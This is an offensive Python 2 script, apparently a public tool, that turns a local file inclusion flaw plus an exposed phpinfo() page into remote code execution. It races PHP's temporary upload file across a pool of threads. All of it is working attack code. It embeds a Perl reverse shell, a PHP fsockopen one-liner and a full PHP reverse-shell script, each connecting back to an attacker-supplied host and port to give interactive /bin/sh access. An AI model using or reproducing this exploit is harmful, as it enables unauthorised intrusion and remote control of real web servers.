import requests
from pprint import pprint
import re
import sys
import argparse
from termcolor import colored
import pyfiglet
import threading
import base64
import random
import string
import time
import socket
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def setup(host,phpinfo,PAYLOAD,PADDING,TAG):
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    REQ1="""POST """+phpinfo+"""?a="""+PADDING+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+PADDING+"""\r
HTTP_ACCEPT: """ + PADDING + """\r
HTTP_USER_AGENT: """+PADDING+"""\r
HTTP_ACCEPT_LANGUAGE: """+PADDING+"""\r
HTTP_PRAGMA: """+PADDING+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)

    return (REQ1)


def debug(msg,VERBOSE):
 if (VERBOSE):
   print colored('[DEBUG] '+msg, "blue")

def perror(msg):
   print colored('[ERROR] '+msg, "red")

def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
  s.connect((host, port))
  s.send(reqphp)
  d = ""
  while len(d) < offset:
    d += s.recv(offset)
  try:
    i = d.index("[tmp_name] =&gt")
    fn = d[i+17:i+31]
  except ValueError:
    return None
      
  d = http.request('GET', LFI_PATH % fn).data
  debug(d,VERBOSE)
  if d.find(TAG) != -1:
    return fn
  else:
    return None  

counter=0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, t, r, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.payload_type = t
        self.revshell_name = r
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    if self.payload_type == 3:
                      print colored("\nGot it! Reverse php Shell created in %s" % self.revshell_name,'green')
                    else:
                      print colored("\nGot it! the payload  %s is executed in the remote host" % self.payload_type,"green")
                    self.event.set() 
            except socket.error:
                return

def main():
    arg_parser = argparse.ArgumentParser(description='RCE from LFI with PHPINFO assistance')
    arg_parser.add_argument('-l','--lfi', dest='lfi', help='the url path of the LFI vuln, per example "http://127.0.0.1:8080/lfi.php?file=" ', type=str, required=True)
    arg_parser.add_argument("-t","--threads", dest="threads", type=int, help="Threads number, set to 10 by default", default=10)
    arg_parser.add_argument('--lhost', dest='lhost', help='The local ip to listen, for rev shell', type=str, required=True)
    arg_parser.add_argument('--lport', dest='lport', help='The local port to listen, for rev shell', type=int, required=True)
    arg_parser.add_argument('-i','--phpinfo', dest='phpinfo', help='Define the url path of the "phpinfo" script. Per ex: "http://host/phpinfo.php"', type=str, required=True)
    arg_parser.add_argument('--payload', dest='ptype', help='Set the type of payload to use.\n 1|2|3  By default payload is set to 3', type=int, default=3)
    arg_parser.add_argument('-e','--end', dest='reqend', help='Define any end of lfi request, per examlpe "%%00"\n by default the end request is empty', type=str, default='')
    arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
    args = arg_parser.parse_args()
    if args.verbose.lower() in ('yes', 'true', 't', 'y', '1'):
      VERBOSE= True
    else:
      VERBOSE= False
    LFI_PATH=args.lfi
    PHPINFO_PATH=args.phpinfo
    # verify if both urls are reachable
    try:
      if requests.get(LFI_PATH).status_code in (404,403) or requests.get(PHPINFO_PATH).status_code in (404,403):
        perror("LFI url path or PHPINFO url path is not reachable !\n")
        sys.exit(1)
    except requests.exceptions.MissingSchema, e:
      perror("LFI url path or PHPINFO url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    except requests.exceptions.ConnectionError, e:
      perror("LFI url path or PHPINFO url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    # verify payload input
    if args.ptype <= 0 or args.ptype > 3 :
      perror("Payload parameter should be an integer value: 1 or 2 or 3 !\n")
      sys.exit(1)      
    ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
    print("")
    print(ascii_banner)
    print colored('Find all scripts in: https://github.com/roughiz\n\n', "green")  
    print colored("LFI With PHPInfo() RCE script", "green")
    print "-=" * 50+"\n"
    poolsz=args.threads
    # create a base64 encode rev shell perl 
    template='use Socket;$i="'+args.lhost+'";$p='+str(args.lport)+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    template2="""<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '%s';  
$port = %s;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);  
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}
?>""" % (args.lhost,args.lport)
    # define the template to encode
    TEMPLATES ={}
    TEMPLATES[1]=template
    TEMPLATES[3]=template2
    TEMPLATES[2]=""
    base64revshell=base64.b64encode(TEMPLATES[args.ptype])

    # define the end of lfi request
    if args.reqend != "":
       args.reqend="%"+args.reqend  
    # setup payloads and lfi and tag
    TAG="Security Test"
    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(12)])+".php"
    PAYLOAD1="""%s\r
<?php $file = fopen("/tmp/shell.pl", "w"); fwrite($file,base64_decode("%s")); fclose($file); exec("`which perl` /tmp/shell.pl &"); ?>\r""" % (TAG,base64revshell)
    PAYLOAD2="""%s\r
<?php $sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");?>\r""" % (TAG,args.lhost,args.lport)
    PAYLOAD3="""%s\r
<?php $file = fopen("%s", "w"); fwrite($file,base64_decode("%s")); fclose($file); ?>\r""" % (TAG,revshell_name,base64revshell)
    PAYLOADS= {}
    PAYLOADS[1]=PAYLOAD1
    PAYLOADS[2]=PAYLOAD2
    PAYLOADS[3]=PAYLOAD3
    PAYLOAD=PAYLOADS[args.ptype]
    LFI_PATH+="%s"+args.reqend
    # phpinfo post params
    PADDING="A" * 5000
    COOKIES= {"PHPSESSID":"q249llvfromc1or39t6tvnun42;","othercookie":PADDING}
    #HEADERS= {"HTTP_ACCEPT":PADDING, "HTTP_USER_AGENT":PADDING, "HTTP_ACCEPT_LANGUAGE":PADDING, "HTTP_PRAGMA": PADDING, "Accept-Encoding": None, "Accept": None,"User-Agent": None, "Connection": None} 
    HEADERS= {"HTTP_ACCEPT":PADDING, "HTTP_USER_AGENT":PADDING, "HTTP_ACCEPT_LANGUAGE":PADDING, "HTTP_PRAGMA": PADDING}
    PHPINFO_PATH+='?a='+PADDING
    files = {'file': ('test.txt',PAYLOAD, 'text/plain')}

    debug("\nLFIrequest template : "+LFI_PATH,VERBOSE)
    response = requests.post(PHPINFO_PATH, files=files,headers=HEADERS, cookies=COOKIES)
    i = response.content.find("[tmp_name] =&gt")
    if i == -1:
      raise ValueError("No php tmp_name in phpinfo output")
    debug("found %s at %i" % (response.content[i:i+10],i),VERBOSE)
    # padded up a bit
    offset= i+256
    if VERBOSE:
      debug("\nPost request template that will be send. url: "+response.request.url,VERBOSE)
      debug("\nPost request template that will be send. headers: "+str(response.request.headers),VERBOSE)

    port = 80
    host=host0=args.phpinfo.split("//")[1].split("/")[0]
    if ":" in host0:
      host=host0.split(":")[0]
      port=int(host0.split(":")[1])
    phpinfo="/"+args.phpinfo.split("//")[1].split("/")[1]  
    reqphp= setup(host0,phpinfo,PAYLOAD,PADDING,TAG)
    debug(""+host0+" "+host+" "+str(port),VERBOSE)
    http = urllib3.PoolManager()
    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print colored("Spawning worker pool (%d)..." % poolsz,"green")
    tp = []
    payload_type = args.ptype
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, payload_type, revshell_name, VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        
        if e.is_set():
            print colored("\nYep! The payload works great !","green")
            if args.ptype == 3:
             url =LFI_PATH%revshell_name
             print colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow")
             try:
               requests.get(url,verify=False,headers={'Connection':'close'},timeout=10)
             except requests.exceptions.ReadTimeout:
               print colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow")
        else:
            print colord(":(",'red')
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()